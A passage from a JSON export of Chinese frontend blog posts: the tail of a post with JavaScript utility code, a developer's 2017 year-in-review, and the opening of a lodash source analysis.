class=\"hljs-keyword\"\u003ecase\u003c/span\u003e this.notDealtWith:\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'5'\u003c/span\u003e;\n\u0009\u0009default:\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e;\n\u0009\u0009}\n\u0009},\n};\n    \n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e { FeedbackStatus };\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e前后端字段映射\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e前端是驼峰命名法，后端是下划线“_”，所以需要做一个映射，同时也更加方便debug。暂时用如下笨方法。这一块写在node那层比较好。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e const ToFE = {\n\u0009errno: \u003cspan class=\"hljs-string\"\u003e'errno'\u003c/span\u003e,\n\u0009errmsg: \u003cspan class=\"hljs-string\"\u003e'errmsg'\u003c/span\u003e,\n}\n    \n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e const ToBackup = {\n\u0009errno: \u003cspan class=\"hljs-string\"\u003e'errno'\u003c/span\u003e,\n\u0009errmsg: \u003cspan class=\"hljs-string\"\u003e'errmsg'\u003c/span\u003e,\n}\n\nimport { ToFE, ToBackup } from \u003cspan class=\"hljs-string\"\u003e'../config/define'\u003c/span\u003e;\n    \nclass Tools {\n\u0009/**\n\u0009 * isObject\n\u0009 * @param {*} data\n\u0009 */\n\u0009isObject(data) {\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e Object.prototype.toString.call(data) === \u003cspan class=\"hljs-string\"\u003e'[object Object]'\u003c/span\u003e;\n\u0009}\n\u0009/**\n\u0009 * isArray\n\u0009 * @param {*} data\n\u0009 */\n\u0009isArray(data) {\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e Object.prototype.toString.call(data) === \u003cspan class=\"hljs-string\"\u003e'[object Array]'\u003c/span\u003e;\n\u0009}\n\u0009/**\n\u0009 * field Transfer\n\u0009 * 后端\u003cspan class=\"hljs-string\"\u003e\"_\"\u003c/span\u003e格式字段映射到前端驼峰命名字段\n\u0009 * @param {*} data\n\u0009 * recursion =\u0026gt; 递归遍历对象和数组两种类型的数据\n\u0009 */\n\u0009fieldTransfer(data) {\n\u0009\u0009// 对象类型\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.isObject(data)) {\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e this.objectTransfer(data);\n\u0009\u0009}\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.isArray(data)) {\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e this.arrTransfer(data);\n\u0009\u0009}\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e data;\n\u0009}\n    \n\u0009// 对象遍历\n\u0009objectTransfer(data) {\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e result = {};\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (const item \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e data) {\n\u0009\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.isObject(data[item])) {\n\u0009\u0009\u0009\u0009result[ToFE[`\u003cspan class=\"hljs-variable\"\u003e${item}\u003c/span\u003e`] || item] = this.objectTransfer(data[item]);\n\u0009\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econtinue\u003c/span\u003e;\n\u0009\u0009\u0009}\n\u0009\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.isArray(data[item])) {\n\u0009\u0009\u0009\u0009result[ToFE[`\u003cspan class=\"hljs-variable\"\u003e${item}\u003c/span\u003e`] || item] = this.arrTransfer(data[item]);\n\u0009\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econtinue\u003c/span\u003e;\n\u0009\u0009\u0009}\n\u0009\u0009\u0009result[ToFE[`\u003cspan class=\"hljs-variable\"\u003e${item}\u003c/span\u003e`] || item] = data[item];\n\u0009\u0009}\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e result;\n\u0009}\n    \n\u0009// 数组遍历\n\u0009arrTransfer(data) {\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e result = [];\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e i = 0, j = data.length; i \u0026lt; j; i++) {\n\u0009\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.isObject(data[i])) {\n\u0009\u0009\u0009\u0009result[i] = this.objectTransfer(data[i]);\n\u0009\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econtinue\u003c/span\u003e;\n\u0009\u0009\u0009}\n\u0009\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.isArray(data[i])) {\n\u0009\u0009\u0009\u0009result[i] = this.arrTransfer(data[i]);\n\u0009\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econtinue\u003c/span\u003e;\n\u0009\u0009\u0009}\n\u0009\u0009\u0009result[i] = data[i];\n\u0009\u0009}\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e result;\n\u0009}\n    \n\u0009// 接口参数对象构建\n\u0009buildParams(parameters) {\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!this.isObject(parameters)) {\n\u0009\u0009\u0009throw \u003cspan class=\"hljs-string\"\u003e'parameters must be array object'\u003c/span\u003e;\n\u0009\u0009}\n\u0009\u0009const params = {};\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (Object.keys(parameters) === 0) {\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e params;\n\u0009\u0009}\n    \n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e key \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e parameters) {\n\u0009\u0009\u0009parameters[key] !== \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e \u0026amp;\u0026amp; (params[ToBackup[key]] = parameters[key]);\n\u0009\u0009}\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e params;\n\u0009}\n}\n    \n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default new Tools();\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003eAPI层\u003c/h4\u003e\n\u003cp\u003e目前 tools.buildParams(parameters) 这一块的传参还在纠结以对象传还是以数组传，以数组传直接传 arguments 就可以，缺点是传参以黑盒来传，无法判断参数，无法快速debug；优点是_fetchxxx里的参数也不需要列出，直接一个对象就行。 以对象传需要自己构建，缺点是需要重复写一次参数；优点是更加直观。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e/**\n * xxx接口\n * /xxx/v1/xxx/xxx\n * @param {*}\n * firstLevel =\u0026gt; (可选参数) =\u0026gt; xxx\n * midLevel =\u0026gt; (可选参数) =\u0026gt; xxx\n * lastLevel =\u0026gt; (可选参数) =\u0026gt; xxx\n * startAt =\u0026gt; (可选参数) =\u0026gt; xxx\n * endAt =\u0026gt; (可选参数) =\u0026gt; xxx\n */\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e const _fetchxxx = ({\n\u0009firstLevel = \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n\u0009midLevel = \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n\u0009lastLevel = \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n\u0009startAt = \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n\u0009endAt = \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n}) =\u0026gt; {\n\u0009const parameters = { firstLevel, midLevel, lastLevel, startAt, endAt };\n\u0009const params = tools.buildParams(parameters);\n\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e request(`\u003cspan class=\"hljs-variable\"\u003e${xxx}\u003c/span\u003exxx/xxx`, {\n\u0009\u0009method: \u003cspan class=\"hljs-string\"\u003e'post'\u003c/span\u003e,\n\u0009\u0009body: qs.stringify(params),\n\u0009}).then(data =\u0026gt; tools.fieldTransfer(data));\n};\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e缓存\u003c/h4\u003e\n\u003cp\u003e统一缓存命名规范，防止缓存冲突\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eclass LocalStorage {\n \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e(key, val) {\n window.localStorage \u0026amp;\u0026amp; \u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003eStorage.setItem(key, JSON.stringify(val));\n }\n get(key) {\n \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e window.localStorage \u0026amp;\u0026amp; JSON.parse(\u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003eStorage.getItem(key));\n }\n remove(key) {\n window.localStorage \u0026amp;\u0026amp; \u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003eStorage.removeItem(key);\n }\n sSet(key, val) {\n window.sessionStorage \u0026amp;\u0026amp; sessionStorage.setItem(key, JSON.stringify(val));\n }\n sGet(key) {\n \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e window.sessionStorage \u0026amp;\u0026amp; JSON.parse(sessionStorage.getItem(key));\n }\n sRemove(key) {\n window.sessionStorage \u0026amp;\u0026amp; sessionStorage.removeItem(key);\n }\n}\n    \n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e Storage = new LocalStorage();\n    \nStorage.KEYS = {\n TOKEN: \u003cspan class=\"hljs-string\"\u003e'TOKEN'\u003c/span\u003e,\n PV_KEY: \u003cspan class=\"hljs-string\"\u003e'PV_KEY'\u003c/span\u003e\n};\n    \nObject.freeze \u0026amp;\u0026amp; Object.freeze(Storage.KEYS);\n    \n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default Storage;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003eFeature\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e模块按需加载，自定义各模块间通信机制\u003c/li\u003e\n\u003cli\u003e模块注册脚手架，前端接入提供注册工具，模块单独部署，动态注册，独立 CDN。编译由服务端统一执行\u003c/li\u003e\n\u003cli\u003e服务端项目代码自身预编译，提高执行性能、降低部署风险\u003c/li\u003e\n\u003cli\u003e编译结果统一保存，支持按分支名切换、回滚\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 class=\"heading\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e还有很多好玩的东西可以搞，每一次的优化都是对自身的一次重构。2018 fighting！！！\u003c/p\u003e\n","buildTime":"1514894837.9093","__v":0}
{"_id":{"$oid":"5a4b76348b69bb25d83da3da"},"id":"5a4af8556fb9a045023c0004","author":{"$oid":"5a4b76338b69bb25d83da3cc"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/2/160b4dd14dabcd6b?w=669\u0026h=412\u0026f=png\u0026s=201062","https://user-gold-cdn.xitu.io/2018/1/2/160b4dd38aa8571d?w=668\u0026h=403\u0026f=png\u0026s=178487","https://user-gold-cdn.xitu.io/2018/1/2/160b4dd5bc71962e?w=666\u0026h=413\u0026f=png\u0026s=379658","https://user-gold-cdn.xitu.io/2018/1/2/160b4dd77e4cd787?w=665\u0026h=412\u0026f=png\u0026s=259314","https://user-gold-cdn.xitu.io/2018/1/2/160b4dda97be0d75?w=667\u0026h=413\u0026f=png\u0026s=262758","https://user-gold-cdn.xitu.io/2018/1/2/160b4ddc868544ba?w=666\u0026h=384\u0026f=png\u0026s=489918","https://user-gold-cdn.xitu.io/2018/1/2/160b4ddfce441d7e?w=667\u0026h=366\u0026f=png\u0026s=209125","https://user-gold-cdn.xitu.io/2018/1/2/160b4de302ca5c93?w=666\u0026h=415\u0026f=png\u0026s=229473","https://user-gold-cdn.xitu.io/2018/1/2/160b55cd5bb56ba8?w=430\u0026h=430\u0026f=jpeg\u0026s=40855"],"screenShot":null}],"title":"回望2017：一个前端从业者砥砺前行的一年","meta":{"likeCount":0},"tag":["前端","程序员"],"comment":[],"shortContent":"从年前就嚷嚷着要走出去走出去，转眼间已经到了年底依然在我的大太原呆着。年底了，不能免俗的我，也来写一篇2017年度工作总结的文章，凑凑热闹。如果对你有一点点启发，或者感悟，那我写这些文字也算值了。 说实话，这是我从事前端三年以来，第一次认真写年度工作总结，提笔一瞬间，感觉今年的…","content":"\u003ch3 class=\"heading\"\u003e前言\u003c/h3\u003e\n\u003cp\u003e从年前就嚷嚷着要走出去走出去，转眼间已经到了年底依然在我的大太原呆着。年底了，不能免俗的我，也来写一篇2017年度工作总结的文章，凑凑热闹。如果对你有一点点启发，或者感悟，那我写这些文字也算值了。\u003c/p\u003e\n\u003cp\u003e接下来，正文从这开始～\u003c/p\u003e\n\u003cp\u003e说实话，这是我从事前端三年以来，第一次认真写年度工作总结，提笔一瞬间，感觉今年的路走的挺坎坷的，一步一个坑，有坑就要努力往出爬，每次爬坑的经历或多或少都会有些收获。或许，人生这个阶段应该叫，磨砺。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eMacBook Pro对我编程的影响\u003c/h3\u003e\n\u003cp\u003e在说起我的现任MBP之前，先来追溯下我的前任-宏碁笔记本，它的配置如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eIntel Core I5-2450M CPU处理器\n\n2G运行内存RAM\n\n500G机械硬盘\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这台笔记本，在我进了编程培训班的第二年就跟着我了，一直陪伴到今年年初。现在想想，满打满算4年了。我对它还是蛮有感情的，毕竟是我用过的第一台笔记本电脑。至今我都能回想起当初深夜在宿舍敲代码的经历，那会儿我们正在学HTML+CSS，\u0026lt;熬夜\u0026gt;\u0026lt;/撸码\u0026gt;，这对标签成了我们当时最真实的写照。\u003c/p\u003e\n\u003cp\u003e时间一晃，四年过去了。我的这台笔记本渐渐地变的卡顿，2G内存逐渐跟不上了越来越多的软件程序的高负荷运转。圈里不是有句话么，低于2G内存的笔记本就不要用于编程了，否则有你后悔的时候。服役了这么长时间，是时候让它退役了。\u003c/p\u003e\n\u003cp\u003e于是乎，在2017年年初的时候，我人生中第一台MacBook Pro就这样承前启后地来到了我的身边。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b4dd14dabcd6b?w=669\u0026amp;h=412\u0026amp;f=png\u0026amp;s=201062\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e这是我刚从邮政取回来包裹时拍的照片，当时还没来及拆。回家开箱的一瞬间，我承认被它征服了。虽然我不是果粉，但还是被它出色的工业设计、视网膜级别的Retina屏幕，实用的macOS系统以及后来我接触到的高性能所吸引了。\u003c/p\u003e\n\u003cp\u003e当然，我买的是内存8G的入门版。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b4dd38aa8571d?w=668\u0026amp;h=403\u0026amp;f=png\u0026amp;s=178487\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e刚入手的那段时间，恰逢我正在学习node.js 和 MongoDB。俗话说，没有对比就没有伤害，之前那台宏碁笔记本在启动一个photoshop都卡的要死，更别提特别吃内存的webstorm了。自从用上MBP后，感觉瞬间流畅了好多，有种刚还在北京四环堵车，突然间开到了青藏高速公路上的快感。\u003c/p\u003e\n\u003cp\u003e一开始，体验了一下homebrew，一款MacOS平台下的软件包管理工具。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b4dd5bc71962e?w=666\u0026amp;h=413\u0026amp;f=png\u0026amp;s=379658\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e然后，秀了一把node和MongoDB操作：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b4dd77e4cd787?w=665\u0026amp;h=412\u0026amp;f=png\u0026amp;s=259314\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b4dda97be0d75?w=667\u0026amp;h=413\u0026amp;f=png\u0026amp;s=262758\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e当初因为MongoDB的Mac配置环境，还捣鼓了半天，有相同问题困扰的小伙伴可以私信我。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b4ddc868544ba?w=666\u0026amp;h=384\u0026amp;f=png\u0026amp;s=489918\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e最后秀一把nodejs加密模块的处理，自己琢磨出来的。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b4ddfce441d7e?w=667\u0026amp;h=366\u0026amp;f=png\u0026amp;s=209125\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e运营公众号的收获与感悟\u003c/h3\u003e\n\u003cp\u003e公众号运营是今年6月份有的这个想法，然后7月份开始写的文章。走过了2017这一年，公众号的名称前前后后改了三次，最后定格为：闰土哥的前端路（running_hacker）。先说下这半年来运营公众号的数据：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e发表原创文章23篇；\n\n收获粉丝关注人数1000+；\n\n最高一篇文章的阅读量停留在了6283；\n\n开通了前端技术交流群，人数380+（之前清理了将近50多个长期不发言的）；\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这半年时间里，每天都有关注和取关的同行以及同学，现在的我已经学会淡然处之了。原创文章在今年下半年发表了23篇，相当于一周一篇的节奏。中途也曾遇到过停更的困境，一停就是两个月。当时也听说了有不少技术公众号运营了一段时间就停更了，有的甚至废弃一旁，再也没有精力去插手。而我，却不想做其中的一员，想继续坚持下去。说真的，仅靠业余时间来坚持运营公众号是一件非常不容易的事情。工作上，你可能会碰上公司业务繁忙，项目刚刚启动，每天加班到八九点钟，下班回到家已经10点多了的情况。生活上，你可能会碰到搬家、学驾照、陪女朋友逛街、户外跑步健身、朋友聚餐等占用你业余时间的事情。总之，如果你想有固定的时间来运营公众号，你会挤占很多你工作之外的时间。可能别人在看你写的一篇文章，看完也就完了。而这篇文章很有可能是你熬夜写出来的，写文章需要梳理思绪，需要润色文字，需要引经据典（这里指的是代码片段），通常这些事情，会让你用两到三个小时的时间才能完成。这背后的艰辛，估计只有运营过公众号的童鞋才会有切身体会吧。\u003c/p\u003e\n\u003cp\u003e所以说，个人运营公众号，真的是一件需要坚持坚持再坚持才能走下去的事情。对于那些长期坚持写原创文章的作者，咱们还是且行且珍惜吧。\u003c/p\u003e\n\u003cp\u003e当然，付出总有回报。接下来我们说说从运营公众号这件事情里所收获的感悟。很多博客大佬都建议萌新要养成写文章总结的习惯。可以帮你梳理你学到的知识，也能分享你的一些职场上的经验。关于写博带来的好处，我是受益匪浅，不仅让我加深了学到的技术知识，还认识了好多志同道合的同行朋友们（其中不乏一些大厂的同行），间接地扩大了自己的前端圈子，提升了自己在圈内的影响力，虽然这个影响力可能微乎其微。\u003c/p\u003e\n\u003cp\u003e刚开始我只是在公众号里推送文章，后来在朋友的推荐下，陆续开通了博客园、掘金、segmentfault、CSDN、简书、慕课网手记等博客专栏，从中收获了更多前端同行的认同与指教，也让我对前端这个圈子有了更深刻的认识。\u003c/p\u003e\n\u003cp\u003e在这里，闰土感谢你们一直以来对我的关注与支持。2018年，我会继续前行，前端路上我们不孤单。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eVue学以致用在工作中得到实践\u003c/h3\u003e\n\u003cp\u003e今年在技术上的沉淀就是整体看完了一遍JavaScript高级程序设计，俗名红宝书。关于读后感，可以参考我之前写的系列文章：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e闰土说JS进阶之变量\n\n闰土说JS进阶之作用域链\n\n闰土说JS进阶之「戏说数组」\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e说完基础，再来说说Vue这门MVVM框架。今年在工作中最大的收获就是学习完Vue 然后在公司项目中得到了实践，世间最美好的事情莫过于此。好多身处二三线城市、忙碌于小厂的童鞋们应该深有体会，你平时自学的热门前端框架在北上广深等一线城市都用烂了，然后在你们公司的项目中却很少见到它们的身影。学不能以致用，呜呼哀哉！\u003c/p\u003e\n\u003cp\u003e关于今年对Vue的输出，你们也可以参考下我前段时间写的系列文章，以下是传送门：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e在没有DOM操作的日子里，我是怎么熬过来的（上）\n\n在没有DOM操作的日子里，我是怎么熬过来的（中）\n\n在没有DOM操作的日子里，我是怎么熬过来的（终结篇）\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 class=\"heading\"\u003e我与微信小程序的邂逅\u003c/h3\u003e\n\u003cp\u003e自从今年年初微信发布了小程序之后，我就对它保持持续的关注。期间为了巩固API，还练手写了一个demo。这是一个以战狼2为主题的、集阅读与电影为一体的小程序。以下是一个代码片段：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b4de302ca5c93?w=666\u0026amp;h=415\u0026amp;f=png\u0026amp;s=229473\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e在2017年行将结束的时候，微信小程序放了一个大招，“跳一跳”瞬间成为朋友圈的热门游戏。有大佬说，国内不存在移动互联网，只有微信互联网。这或许不是一句玩笑话。微信通过“跳一跳”秀了一把小程序的肌肉💪，此番更新，或许是微信朝着这个目标迈出的一大步。小程序，大野心，让我们拭目以待吧！\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e比今晚不加班更能让程序员兴奋的话是，欢迎业主回家\u003c/h3\u003e\n\u003cp\u003e今年我正式开始考虑买房交首付的事情了，岁月不饶人啊。曾经的90后闰土少年，如今已然变成了闰土大叔小哥哥。作为程序员，我想大家最大的愿望就是拥有一套属于自己的房子。没有房子，到哪儿都是流浪。\u003c/p\u003e\n\u003cp\u003e今年我和我媳妇儿看了一处楼盘，异常心动，如果不是钱的问题，我估计我们当时都有买下来的冲动。那处楼盘位于太原市小店区偏南地段，离榆次区不远，楼盘名字叫枫林四季。小区户型不错，南北通透，一梯两户。均价4500，这价格绝对属于太原市最便宜的楼盘之一了。售楼部的人给我们介绍，小产权大户型，总价40万出头，首付20万，可按揭，还贷8年，月供2100。多么诱人的条件，能用钱解决的问题，都不是问题。问题是我们没钱啊。\u003c/p\u003e\n\u003cp\u003e让我来说说在二三线城市买房交首付的现实问题吧。以我的老家太原为例，山西省会城市，据我了解，今年太原中环以内的房价都在1万左右，1万以下的都算便宜的。据售楼部的朋友说，未来两年太原的房价还会迎来新一波的涨价潮，到了2020年，太原会承办全国青少年运动会，简称青运会。青运会的主办地在晋源区的山西红灯笼体育中心，汾河公园三期工程将在附近地段展开，预计到时候附近的楼盘绝对会顺势而涨。到时候，地铁2号线也会全线开通运营，紧邻地铁线的楼盘估计又要疯长一波了。\u003c/p\u003e\n\u003cp\u003e所以，房价到底涨不涨，还是售楼部小姐的那句话最经典：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e先生，赶紧买吧！明年房价一定会涨的！\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e要不就是财经专家的那句金句：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e买房最好的时机，是去年。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e作为小编的我，只期盼2018年的工资能再涨上一涨。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e2018年该立的旗帜\u003c/h3\u003e\n\u003cp\u003e关于2018年的小计划，我要给自己立几个flag：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e1、录制一些关于前端的入门视频教程；\n\n    我现在还没想好要录制的方向，先立着吧，万一实现了呢？\n\n2、希望自己可以继续研究下vue、react、node、rn、小程序等；\n\n3、坚持锻炼身体；\n\n    户外跑步健身这件事，我已经陆陆续续热爱了10来年了。不解释，强悍的人生需要一个强健的体魄来支撑。\n\n4、希望2018年可以定下终身大事；\n\n5、最后，希望自己的工资能再涨一波。\n\n    多攒点钱，明年希望自己能够离首付更近一点（base 太原）。\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 class=\"heading\"\u003e后记\u003c/h3\u003e\n\u003cp\u003e2017，我在太原\u003c/p\u003e\n\u003cp\u003e2018，我在哪儿\u003c/p\u003e\n\u003cp\u003e这个问题，恐怕连我自己也回答不了，那就交给时间来处理吧。时间是最好的魔法师，她会给我们最合适的答案。\u003c/p\u003e\n\u003cp\u003e最后，祝大家在新的一年里，工作顺利，家庭和睦。如果你有什么新年小目标，欢迎在下方留言讨论，闰土大叔在这里等你。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e声明\u003c/p\u003e\n\u003cp\u003e欢迎转载，请注明出处和作者，同时保留声明。\u003c/p\u003e\n\u003cp\u003e作者：闰土大叔\u003c/p\u003e\n\u003cp\u003e出处：https://juejin.im/post/5a4af8556fb9a045023c0004\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e想了解我的更多动态？\n欢迎关注我的微信公众号：\u003cstrong\u003e闰土哥的前端路\u003c/strong\u003e ，\n或者添加我的个人微信号：\u003cstrong\u003ewxd91traveler\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b55cd5bb56ba8?w=430\u0026amp;h=430\u0026amp;f=jpeg\u0026amp;s=40855\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n","buildTime":"1514894773.748","__v":0}
{"_id":{"$oid":"5a4b76348b69bb25d83da3d9"},"id":"5a4ad51d6fb9a04525787954","author":{"$oid":"5a4b76338b69bb25d83da3d3"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/2/160b450acc4027af?w=865\u0026h=777\u0026f=png\u0026s=83935","https://user-gold-cdn.xitu.io/2017/12/7/1602e879207eb857?w=430\u0026h=430\u0026f=jpeg\u0026s=40267"],"screenShot":null}],"title":"lodash源码分析之Hash缓存","meta":{"likeCount":0},"tag":["JavaScript","前端框架","前端","源码","函数式编程"],"comment":[],"shortContent":"Hash 顾名思义，就是要有一个离散的序列，根据 key 来储取数据。而在 javascript 中，最适合的无疑是对象了。 Hash 在 lodash 的 .internal 文件夹中，作为内部文件来使用。lodash 会根据不同的数据类型选择不同的缓存方式，Hash 便是其…","content":"\u003cblockquote\u003e\n\u003cp\u003e在那小小的梦的暖阁，我为你收藏起整个季节的烟雨。\u003c/p\u003e\n\u003cp\u003e——洛夫《灵河》\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e本文为读 lodash 源码的第四篇，后续文章会更新到这个仓库中，欢迎 star：\u003ca target=\"_blank\" href=\"https://github.com/yeyuqiudeng/pocket-lodash\"\u003epocket-lodash\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003egitbook也会同步仓库的更新，gitbook地址：\u003ca target=\"_blank\" href=\"https://www.gitbook.com/book/yeyuqiudeng/pocket-lodash/details\"\u003epocket-lodash\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e作用与用法\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eHash\u003c/code\u003e 顾名思义，就是要有一个离散的序列，根据 \u003ccode\u003ekey\u003c/code\u003e 来储取数据。而在 javascript 中，最适合的无疑是对象了。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eHash\u003c/code\u003e 在 lodash 的 